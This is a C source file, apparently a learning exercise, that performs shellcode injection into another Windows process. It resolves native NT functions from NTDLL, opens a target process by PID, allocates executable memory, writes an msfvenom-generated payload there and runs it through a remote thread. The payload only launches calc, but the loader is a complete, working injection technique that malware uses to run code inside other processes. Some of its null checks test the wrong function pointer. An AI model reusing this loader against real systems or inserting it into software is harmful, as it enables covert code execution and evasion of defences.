#include "../header.h"
#include "nt_setup.h"

HMODULE get_module(const WCHAR*);
FARPROC get_proc_address(HMODULE, LPCSTR, LPCSTR);


int main(int argc, char** argv){
  int       ret_value = EXIT_SUCCESS;
  NTSTATUS  status;
  DWORD     PID       = 0;
  PVOID     rBuffer   = NULL;
  HANDLE    hProcess  = NULL;
  HANDLE    hThread   = NULL;
  HMODULE   hNTDLL    = NULL;
  
  /* msfvenom --platform windows --arch x86 -p windows/exec cmd=calc -f c --var-name=shellcode */
  /* ! - this shellcode is only compatible with 32-bit programs */ 
  unsigned char shellcode[] = 
  "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
  "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
  "\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
  "\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
  "\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
  "\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
  "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
  "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
  "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
  "\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
  "\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
  "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
  "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
  "\xff\xd5\x63\x61\x6c\x63\x00"; 
  size_t          shellcode_size   = sizeof(shellcode);
  size_t          bytes_written    = 0;

  if(argc < 2){
    print_err("Insufficient number of arguments");
    print_warn("usage: %s <PID>", argv[0]);
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }

  PID = atoi(argv[1]);

  OBJECT_ATTRIBUTES OA  = {sizeof(OBJECT_ATTRIBUTES), NULL};
  CLIENT_ID         CID = {(PVOID)PID, NULL};

  hNTDLL = get_module(L"NTDLL");
  if(hNTDLL == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  
  /* --------[GETTING FUNCTIONS]------- */
  NtOpenProcess nt_open = (NtOpenProcess)get_proc_address(hNTDLL, "NtOpenProcess", "nt_open");
  if(nt_open == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  NtAllocateVirtualMemory nt_alloc_virtual_mem = (NtAllocateVirtualMemory)get_proc_address(hNTDLL, "NtAllocateVirtualMemory", "nt_alloc_virtual_mem");
  if(nt_alloc_virtual_mem == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  NtWriteVirtualMemory nt_write_virtual_mem = (NtWriteVirtualMemory)get_proc_address(hNTDLL, "NtWriteVirtualMemory", "nt_write_virtual_mem");
  if(nt_alloc_virtual_mem == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }
  NtCreateThreadEx nt_create_thread = (NtCreateThreadEx)get_proc_address(hNTDLL, "NtCreateThreadEx", "nt_create_thread");
  if(nt_alloc_virtual_mem == NULL) {
    ret_value = EXIT_FAILURE;
    goto CLEANUP;
  }

  /* --------[INJECTION]------- */
  print_info("Getting handle to process (PID: %ld)", PID);
  status = nt_open(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
  if(status != STATUS_SUCCESS) {
    print_err("Failed to get handle to process (PID: %ld). Error: 0x%lx", PID, status);
    goto CLEANUP;
  }
  print_ok("Got handle to process (PID: %ld)", PID);
  print_info("\\___[\n\t  PID:\t\t%ld\n\t  Address:\t0x%p\n\t]", PID, hProcess);


  print_info("Allocating virtual memory");
  status = nt_alloc_virtual_mem(hProcess, &rBuffer, 0, &shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
  if(status != STATUS_SUCCESS) {
    print_err("Failed to allocate buffer in process memory. Error: 0x%lx", status);
    goto CLEANUP;
  }
  print_ok("Succesfully allocated %zu bytes in process memory", sizeof(shellcode));

  
  print_info("Writing to process memory");
  status = nt_write_virtual_mem(hProcess, rBuffer, shellcode, sizeof(shellcode), &bytes_written);
  if(status != STATUS_SUCCESS) {
    print_err("Failed to write to process memory. Error: 0x%lx", status);
    goto CLEANUP;
  }
  print_ok("Succesfully written %zu bytes to process memory", bytes_written);
  print_info("\\___[\n\t  Size:\t\t%zu\n\t  Payload:", bytes_written, shellcode);
  for (int i=0; i<sizeof(shellcode); i++) {
    if(i % 14 == 0){
      printf("\n\t\t");
    }
    printf("0x%02x ", shellcode[i]);
  }
  printf("\n\t]\n");


  print_info("Creating Thread");
  status = nt_create_thread(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, (PVOID)rBuffer, NULL, 0, 0, 0, 0, NULL);
  if(status != STATUS_SUCCESS) {
    print_err("Failed to create thread. Error: 0x%lx", status);
    goto CLEANUP;
  }
  print_ok("Succesfully got handle to thread");
  print_info("\\___[\n\t Parent:\t:%ld\n\t  Address:\t0x%p\n\t]", PID, hThread);

  print_info("Waiting for thread to finish...");
  WaitForSingleObject(hThread, INFINITE);
  print_ok("Thread finished execution");

CLEANUP:
  print_info("Cleaning up");
  if (hThread) {
      print_info("Closing handle to thread");
      CloseHandle(hThread);
  }
  if (hProcess) {
      print_info("Closing handle to process");
      CloseHandle(hProcess);
  }
  print_ok("Cleaned up");
  return ret_value;
}


HMODULE get_module(const WCHAR* name) {
  HMODULE hModule = NULL;

  print_info("Getting handle to module \"%S\"", name);

  hModule = GetModuleHandleW(name);

  if(hModule == NULL){
    print_err("Failed getting handle to module \"%S\". Error: 0x%lx", name, GetLastError());
  } else {
    print_ok("Got handle to the module");
    print_info("\\___[\n\t  Module:\t%S\n\t  Address:\t0x%p\n\t]", name, hModule);
  }

  return hModule;
}

FARPROC get_proc_address(HMODULE hModule, LPCSTR lpProcName, LPCSTR lpNewName){
  FARPROC proc = GetProcAddress(hModule, lpProcName);
  if(proc == NULL) {
    print_err("Failed to get handle to %s. Error: 0x%lx", lpProcName, GetLastError());
    return NULL;
  }
  print_ok("Got %s", lpProcName);
  print_info("\\___[\n\t  Original:\t%s\n\t  New:\t\t%s\n\t  Address:\t0x%p\n\t]", lpProcName, lpNewName, proc);
  return proc;
}
